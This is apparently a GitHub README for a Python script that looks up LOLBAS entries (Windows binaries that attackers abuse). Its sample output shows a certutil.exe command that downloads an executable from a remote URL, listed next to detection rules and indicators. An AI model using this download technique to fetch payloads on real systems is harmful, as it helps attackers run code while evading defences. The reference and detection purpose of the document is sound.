<h3 align="center">LOLBAS-INFO</h3>
<p align="center">
   A simple python script to get information about <b><i>LOLBins/LOLScripts</i></b> quickly.
</p>

## Install
```
git clone https://github.com/D4nex/lolbas-info/
cd lolbas-info
pip install colorama
```

## Usage
```
python3 lolbasinfo.py -h
```
![lolbasimage](https://github.com/user-attachments/assets/c1313ed5-615b-4f49-8a96-8514a592f63d)

```
python3 lolbasinfo.py -l
```
List all available LOLBAS included in the cvs to get your information.

```
python3 lolbasinfo.py -lol <lolbin/lolscript>
```
Get information about the selected LOLBAS.
```console
d4nex@pwn:~$ python3 lolbasinfo.py -lol Certutil.exe
      __        __        __             ___  __
|    /  \ |    |__)  /\  /__`    | |\ | |__  /  \
|___ \__/ |___ |__) /~~\ .__/    | | \| |    \__/
                      author: D4nex


[+] Filename: Certutil.exe
[+] Description: Windows binary used for handling certificates
        >_ Command: certutil.exe -urlcache -split -f {REMOTEURL:.exe} {PATH:.exe}
        >_ Command Description: Download and save executable to disk in the current folder.
        >_ Command Usecase: Download file from Internet
        >_ Command Category: [Download]
        >_ Command Privileges: [User]
        >_ Operating System: [Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11]
        *_ Paths: [C:\Windows\System32\certutil.exe, C:\Windows\SysWOW64\certutil.exe]
        !_ Detections: (Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml, Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml, Elastic: https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml, Elastic: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_verifyctl_and_split_arguments.yml, Splunk: https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_with_decode_argument.yml, IOC: Certutil.exe creating new files on disk, IOC: Useragent Microsoft-CryptoAPI/10.0, IOC: Useragent CertUtil URL Agent)
        *_ Resources: https://twitter.com/Moriarty_Meng/status/984380793383370752, https://twitter.com/mattifestation/status/620107926288515072, https://twitter.com/egre55/status/1087685529016193025
        *_ URL: https://lolbas-project.github.io/lolbas/Binaries/Certutil/
        *_ Tags: []
```

## Issues
- 错误和异常处理
- 面向对象编程，优化结构
- 对代码的评论
